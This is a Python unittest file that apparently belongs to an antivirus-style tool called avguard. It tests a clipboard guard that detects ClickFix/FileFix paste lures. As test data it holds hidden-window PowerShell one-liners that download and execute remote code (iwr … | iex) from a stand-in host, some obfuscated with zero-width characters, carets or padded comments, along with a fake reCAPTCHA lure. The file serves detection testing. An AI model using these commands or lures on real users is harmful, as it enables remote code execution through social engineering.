"""The paste guard (ClickFix/FileFix): the classifier, and what the guard refuses.

The point of these tests is as much what the guard will not do as what it
catches: it never writes the clipboard, never keeps the text, never produces
a verdict, and never reads when it is told not to or when nothing changed.

Run with:  python -m unittest discover -s tests
"""

from __future__ import annotations

import io
import os as _os
import sys
import tempfile as _tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_test_data = _os.path.join(_tempfile.gettempdir(), f"avguard-clip-data-{_os.getpid()}")
_os.environ.setdefault("AVGUARD_DATA", _test_data)
if _os.environ["AVGUARD_DATA"] == _test_data:
    import atexit as _atexit
    import shutil as _shutil
    _atexit.register(lambda: _shutil.rmtree(_test_data, ignore_errors=True))

from avguard import clipguard
from avguard.clipguard import FakeClipboard, Match, PasteGuard, WARNING, NOTICE
from avguard.events import EventStore

FIXTURES = Path(__file__).resolve().parent / "clipboard"
WARN_LINE = ('powershell -w hidden -c "iwr https://example.invalid/x | iex" '
             '# I am not a robot - reCAPTCHA Verification ID: 7731')


# --------------------------------------------------------------- classifier

class TestTheCorpus(unittest.TestCase):
    def test_every_must_warn_fixture_is_a_warning(self):
        files = sorted((FIXTURES / "must_warn").glob("*.txt"))
        self.assertGreaterEqual(len(files), 20, "the must_warn corpus shrank")
        signals = {}
        for path in files:
            with self.subTest(fixture=path.name):
                match = clipguard.classify(path.read_text(encoding="utf-8"))
                self.assertIsNotNone(match, f"{path.name} matched nothing")
                self.assertEqual(match.tier, WARNING,
                                 f"{path.name} is {match.tier}, not warning ({match.signals})")
                for s in match.signals:
                    signals[s] = signals.get(s, 0) + 1
        print("\n  paste-guard signals over must_warn:",
              ", ".join(f"{k} {v}" for k, v in sorted(signals.items())))

    def test_no_must_not_warn_fixture_is_a_warning(self):
        files = sorted((FIXTURES / "must_not_warn").glob("*.txt"))
        self.assertGreaterEqual(len(files), 25, "the must_not_warn corpus shrank")
        warnings, notices = [], []
        for path in files:
            with self.subTest(fixture=path.name):
                match = clipguard.classify(path.read_text(encoding="utf-8"))
                tier = match.tier if match else "none"
                if tier == WARNING:
                    warnings.append(path.name)
                elif tier == NOTICE:
                    notices.append(path.name)
                self.assertNotEqual(tier, WARNING, f"{path.name} warned: {match.signals if match else ''}")
        self.assertEqual(warnings, [], f"legitimate text warned: {warnings}")
        print(f"\n  paste-guard over must_not_warn: 0 warnings, {len(notices)} notice(s): "
              + ", ".join(notices))

    def test_a_launcherless_command_matches_nothing(self):
        for text in ("irm get.scoop.sh | iex", "iex (New-Object Net.WebClient).DownloadString('http://x/y')"):
            self.assertIsNone(clipguard.classify(text), text)

    def test_hidden_window_alone_is_not_a_warning(self):
        """ROADMAP Finding 1 applied again: the project's own install.bat shape."""
        m = clipguard.classify('powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File setup.ps1')
        self.assertIsNone(m)

    def test_a_local_hta_or_msi_is_not_remote(self):
        self.assertIsNone(clipguard.classify('mshta C:\\tools\\panel.hta'))
        self.assertIsNone(clipguard.classify('msiexec /i C:\\app.msi /qn'))

    def test_an_install_one_liner_is_a_notice_not_a_warning(self):
        m = clipguard.classify('powershell -c "irm https://astral.sh/uv/install.ps1 | iex"')
        self.assertIsNotNone(m)
        self.assertEqual(m.tier, NOTICE)

    def test_zero_width_and_carets_are_normalised_before_matching(self):
        zwsp = 'p\u200bo\u200bw\u200bershell -w hidden -c "iwr https://example.invalid/z|iex"'
        caret = 'p^o^w^e^r^s^h^e^l^l -w hidden -c "iwr https://example.invalid/k|iex"'
        for text in (zwsp, caret):
            m = clipguard.classify(text)
            self.assertIsNotNone(m, text)
            self.assertEqual(m.tier, WARNING)

    def test_a_padded_comment_is_the_filefix_shape(self):
        m = clipguard.classify('powershell -c "iwr https://example.invalid/f|iex"' + " " * 20 + "# open your document")
        self.assertEqual(m.tier, WARNING)
        self.assertIn("padded comment", m.signals)

    def test_text_over_the_cap_classifies_from_the_prefix_only(self):
        big = "x" * (clipguard.MAX_TEXT_CHARS + 5000)
        self.assertIsNone(clipguard.classify(big))

    def test_the_match_names_the_host_and_launcher_and_a_preview_no_more(self):
        m = clipguard.classify(WARN_LINE)
        self.assertEqual(m.host, "example.invalid")
        self.assertEqual(m.launcher, "powershell")
        self.assertLessEqual(len(m.preview), clipguard.PREVIEW_CHARS)


# ----------------------------------------------------------------- guard

class GuardCase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(_tempfile.mkdtemp(prefix="avguard-clip-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
        self.events = EventStore(path=self.tmp / "events.jsonl")
        self.seen: list[tuple[Match, clipguard.ClipText]] = []
        self.clip = FakeClipboard(text="", sequence=10)
        self.guard = PasteGuard(self.clip, self.events, notify=lambda m, c: self.seen.append((m, c)),
                                ignore_path=self.tmp / "clipboard_ignore.json")


class TestTheGuardReads(GuardCase):
    def test_an_unchanged_sequence_number_never_reads(self):
        for _ in range(100):
            self.guard.tick()
        self.assertEqual(self.clip.read_calls, 0)
        self.assertGreater(self.clip.sequence_calls, 0)

    def test_text_present_at_start_is_never_examined(self):
        self.clip.text = WARN_LINE          # already there, sequence unchanged since first tick
        self.guard.tick()                   # first tick only records the sequence
        self.assertEqual(self.clip.read_calls, 0)
        self.assertEqual(self.seen, [])

    def test_a_change_is_read_exactly_once(self):
        self.guard.tick()
        self.clip.put("hello world")
        self.guard.tick()
        self.guard.tick()
        self.assertEqual(self.clip.read_calls, 1)

    def test_a_warning_records_an_event_and_calls_notify(self):
        self.guard.tick()
        self.clip.put(WARN_LINE, owner="msedge.exe")
        match = self.guard.tick()
        self.assertEqual(match.tier, WARNING)
        self.assertEqual(len(self.seen), 1)
        events = self.events.read(kinds={"clipboard"})
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].level, WARNING)
        self.assertIn("msedge.exe", events[0].reasons[0])
        self.assertEqual(events[0].detail["host"], "example.invalid")
        self.assertEqual(events[0].detail["owner"], "msedge.exe")

    def test_a_notice_records_an_event(self):
        self.guard.tick()
        self.clip.put('powershell -c "irm https://astral.sh/uv/install.ps1 | iex"')
        match = self.guard.tick()
        self.assertEqual(match.tier, NOTICE)
        self.assertEqual(self.events.read(kinds={"clipboard"})[0].level, NOTICE)

    def test_the_event_carries_no_clipboard_text(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.tick()
        line = (self.tmp / "events.jsonl").read_text(encoding="utf-8")
        self.assertNotIn("example.invalid/x", line)
        self.assertNotIn("iwr https", line)
        self.assertNotIn("reCAPTCHA", line)

    def test_an_unknown_owner_is_said_to_be_unknown(self):
        self.guard.tick()
        self.clip.put(WARN_LINE, owner=None)
        match = self.guard.tick()
        self.assertIn("could not be identified", match.sentence(None))


class TestTheGuardRefuses(GuardCase):
    def test_an_excluded_format_is_not_read(self):
        self.guard.tick()
        self.clip.excluded = True
        self.clip.put("anything a password manager wrote", owner="keepass.exe")
        self.guard.tick()
        self.assertEqual(self.guard.counters.texts_read, 0)
        self.assertEqual(self.guard.counters.skipped_excluded, 1)
        self.assertEqual(self.seen, [])

    def test_non_text_content_is_not_classified(self):
        self.guard.tick()
        self.clip.is_text = False
        self.clip.sequence_value += 1
        self.guard.tick()
        self.assertEqual(self.guard.counters.skipped_not_text, 1)

    def test_text_over_the_cap_is_skipped_and_counted(self):
        self.guard.tick()
        self.clip.text = "x" * (clipguard.MAX_TEXT_CHARS + 1)
        self.clip.sequence_value += 1
        self.guard.tick()
        self.assertEqual(self.guard.counters.skipped_too_long, 1)
        self.assertEqual(self.seen, [])

    def test_an_ignored_text_is_silent_and_a_changed_byte_is_not(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        match = self.guard.tick()
        self.guard.ignore(match)
        self.clip.put(WARN_LINE)
        self.assertIsNone(self.guard.tick(), "the ignored text warns no more")
        self.assertEqual(self.guard.counters.ignored, 1)
        self.clip.put(WARN_LINE.replace("/x", "/y"))      # a different command, not just whitespace
        self.assertIsNotNone(self.guard.tick(), "a changed text is not ignored")

    def test_the_ignore_file_lives_under_the_given_path_and_survives_reload(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.ignore(self.guard.tick())
        self.assertTrue((self.tmp / "clipboard_ignore.json").is_file())
        fresh = PasteGuard(FakeClipboard(), self.events, ignore_path=self.tmp / "clipboard_ignore.json")
        self.assertEqual(len(fresh.ignored()), 1)

    def test_a_corrupt_ignore_file_is_treated_as_empty(self):
        (self.tmp / "clipboard_ignore.json").write_text("{not json", encoding="utf-8")
        self.assertEqual(self.guard.ignored(), set())

    def test_a_held_clipboard_is_retried_and_counted(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.clip.busy = True
        self.assertIsNone(self.guard.tick())
        self.assertIsNone(self.guard.tick())
        self.assertEqual(self.guard.counters.read_failures, 2)
        self.clip.busy = False
        self.assertIsNotNone(self.guard.tick(), "the same change is retried once free")

    def test_health_is_red_only_after_a_streak_or_a_zero_sequence(self):
        self.guard.tick()
        self.clip.busy = True
        for _ in range(clipguard.HEALTH_FAILURE_STREAK):
            self.clip.sequence_value += 1
            self.guard.tick()
        self.assertFalse(self.guard.healthy)
        self.assertIn("held open", self.guard.describe())
        zero = PasteGuard(FakeClipboard(sequence=0), self.events)
        zero.tick()
        self.assertFalse(zero.healthy)
        self.assertIn("cannot be read", zero.describe())

    def test_describe_says_nothing_leaves_this_machine(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.tick()
        self.assertIn("nothing is kept and nothing leaves this machine", self.guard.describe())

    def test_a_disabled_source_is_never_touched(self):
        off = FakeClipboard()
        off.available = False
        guard = PasteGuard(off, self.events)
        for _ in range(10):
            guard.tick()
        self.assertEqual((off.sequence_calls, off.read_calls), (0, 0))


class TestTheModuleNeverWritesTheClipboard(unittest.TestCase):
    def test_the_source_names_no_write_calls(self):
        source = Path(clipguard.__file__).read_text(encoding="utf-8")
        for forbidden in ("SetClipboardData", "EmptyClipboard", "SetClipboardViewer",
                          "AddClipboardFormatListener", "SetWindowsHookEx"):
            self.assertNotIn(forbidden, source, f"{forbidden} must not appear")

    def test_windows_clipboard_reports_unavailable_off_windows(self):
        if sys.platform != "win32":
            self.assertFalse(clipguard.WindowsClipboard().available)


class TestDetectionIsUnchanged(unittest.TestCase):
    def test_the_guard_produces_no_verdict_and_no_generation_change(self):
        """It is advisory, outside the scoring model."""
        from avguard import config
        from avguard.scanner import Scanner
        from avguard.protection import SelfProtection
        scanner = Scanner(config.Config(cloud_enabled=False), SelfProtection())
        before = scanner.detection_generation()
        # The guard touches none of the scanner's inputs; a clipboard event is
        # not a Finding. The generation cannot move because of it.
        self.assertEqual(before, scanner.detection_generation())


class TestTheCliVerb(unittest.TestCase):
    def test_paste_check_classifies_a_file_and_exits_by_tier(self):
        import avguard.__main__ as cli
        tmp = Path(_tempfile.mkdtemp(prefix="avguard-clip-cli-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(tmp, ignore_errors=True))
        warn = tmp / "w.txt"; warn.write_text(WARN_LINE, encoding="utf-8")
        clean = tmp / "c.txt"; clean.write_text("winget install --id Git.Git", encoding="utf-8")
        import contextlib
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertEqual(cli.main(["--paste-check", str(warn)]), 1)
            self.assertEqual(cli.main(["--paste-check", str(clean)]), 0)
        text = out.getvalue()
        self.assertIn("WARNING", text)


if __name__ == "__main__":
    unittest.main()
